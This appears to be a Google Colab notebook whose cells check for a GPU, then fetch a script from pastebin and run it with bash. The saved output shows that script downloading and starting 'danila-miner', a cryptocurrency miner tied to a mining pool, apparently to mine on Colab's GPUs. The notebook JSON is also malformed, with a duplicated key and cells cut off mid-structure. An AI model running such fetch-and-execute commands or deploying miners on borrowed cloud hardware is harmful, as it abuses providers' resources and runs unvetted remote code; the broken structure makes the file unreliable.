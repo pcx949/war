{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "coba2.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "Nzi_H1-di51H"
      ]
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "N4PeWkgu9WEf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ebaa7b5b-ae7e-46de-d124-562b7871a465"
      },
      "source": [
        "source": [
        "#@title cek\n",
        "! nvidia-smi -L"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "GPU 0: Tesla K80 (UUID: GPU-d9f13e0e-329c-d121-f57a-99fe2bd43630)\n"
          ]
        },
        {
      "cell_type": "code",
      "source": [
        "#@title eSCe\n",
        "\n",
        "\n",
        "!apt-get update \n",
        "!apt-get install libpci3\n",
        "!wget https://pastebin.com/raw/G3univhA\n",
        "!bash G3univhA\n"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\r0% [Working]\r            \rGet:1 https://cloud.r-project.org/bin/linux/ubuntu bionic-cran40/ InRelease [3,622 B]\n",
            "Hit:2 http://archive.ubuntu.com/ubuntu bionic InRelease\n",
            "Get:3 http://archive.ubuntu.com/ubuntu bionic-updates InRelease [88.7 kB]\n",
            "Ign:4 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  InRelease\n",
            "Get:5 http://security.ubuntu.com/ubuntu bionic-security InRelease [88.7 kB]\n",
            "Ign:6 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  InRelease\n",
            "Hit:7 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  Release\n",
            "Get:8 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic InRelease [15.9 kB]\n",
            "Hit:9 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  Release\n",
            "Get:10 http://archive.ubuntu.com/ubuntu bionic-backports InRelease [74.6 kB]\n",
            "Hit:11 http://ppa.launchpad.net/cran/libgit2/ubuntu bionic InRelease\n",
            "Get:12 http://ppa.launchpad.net/deadsnakes/ppa/ubuntu bionic InRelease [15.9 kB]\n",
            "Hit:15 http://ppa.launchpad.net/graphics-drivers/ppa/ubuntu bionic InRelease\n",
            "Get:16 http://archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages [2,268 kB]\n",
            "Get:17 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages [3,133 kB]\n",
            "Get:18 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic/main Sources [1,947 kB]\n",
            "Get:19 http://security.ubuntu.com/ubuntu bionic-security/universe amd64 Packages [1,490 kB]\n",
            "Get:20 http://security.ubuntu.com/ubuntu bionic-security/main amd64 Packages [2,694 kB]\n",
            "Get:21 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic/main amd64 Packages [996 kB]\n",
            "Get:22 http://ppa.launchpad.net/deadsnakes/ppa/ubuntu bionic/main amd64 Packages [45.3 kB]\n",
            "Fetched 12.9 MB in 4s (3,217 kB/s)\n",
            "Reading package lists... Done\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following NEW packages will be installed:\n",
            "  libpci3\n",
            "0 upgraded, 1 newly installed, 0 to remove and 40 not upgraded.\n",
            "Need to get 24.1 kB of archives.\n",
            "After this operation, 101 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 libpci3 amd64 1:3.5.2-1ubuntu1.1 [24.1 kB]\n",
            "Fetched 24.1 kB in 0s (56.6 kB/s)\n",
            "Selecting previously unselected package libpci3:amd64.\n",
            "(Reading database ... 155455 files and directories currently installed.)\n",
            "Preparing to unpack .../libpci3_1%3a3.5.2-1ubuntu1.1_amd64.deb ...\n",
            "Unpacking libpci3:amd64 (1:3.5.2-1ubuntu1.1) ...\n",
            "Setting up libpci3:amd64 (1:3.5.2-1ubuntu1.1) ...\n",
            "Processing triggers for libc-bin (2.27-3ubuntu1.3) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/python3.7/dist-packages/ideep4py/lib/libmkldnn.so.0 is not a symbolic link\n",
            "\n",
            "--2022-04-12 18:13:34--  https://pastebin.com/raw/G3univhA\n",
            "Resolving pastebin.com (pastebin.com)... 104.20.68.143, 104.20.67.143, 172.67.34.170, ...\n",
            "Connecting to pastebin.com (pastebin.com)|104.20.68.143|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: unspecified [text/plain]\n",
            "Saving to: ‘G3univhA’\n",
            "\n",
            "G3univhA                [ <=>                ]     293  --.-KB/s    in 0s      \n",
            "\n",
            "2022-04-12 18:13:35 (26.4 MB/s) - ‘G3univhA’ saved [293]\n",
            "\n",
            "--2022-04-12 18:13:35--  https://gitlab.com/ceptianzubaeradhnan/go-badanan/-/raw/main/danila-miner-2.3.1-xenial-hive.tar.gz\n",
            "Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9\n",
            "Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 28048645 (27M) [application/x-gzip]\n",
            "Saving to: ‘danila-miner-2.3.1-xenial-hive.tar.gz’\n",
            "\n",
            "danila-miner-2.3.1- 100%[===================>]  26.75M  89.7MB/s    in 0.3s    \n",
            "\n",
            "2022-04-12 18:13:35 (89.7 MB/s) - ‘danila-miner-2.3.1-xenial-hive.tar.gz’ saved [28048645/28048645]\n",
            "\n",
            "- danila miner version 2.3.1\n",
            ">\n",
            "> To use miner you should register via @WhalesPoolBot\n",
            ">\n"
          ]
        }
      ]
    }
  ]
}
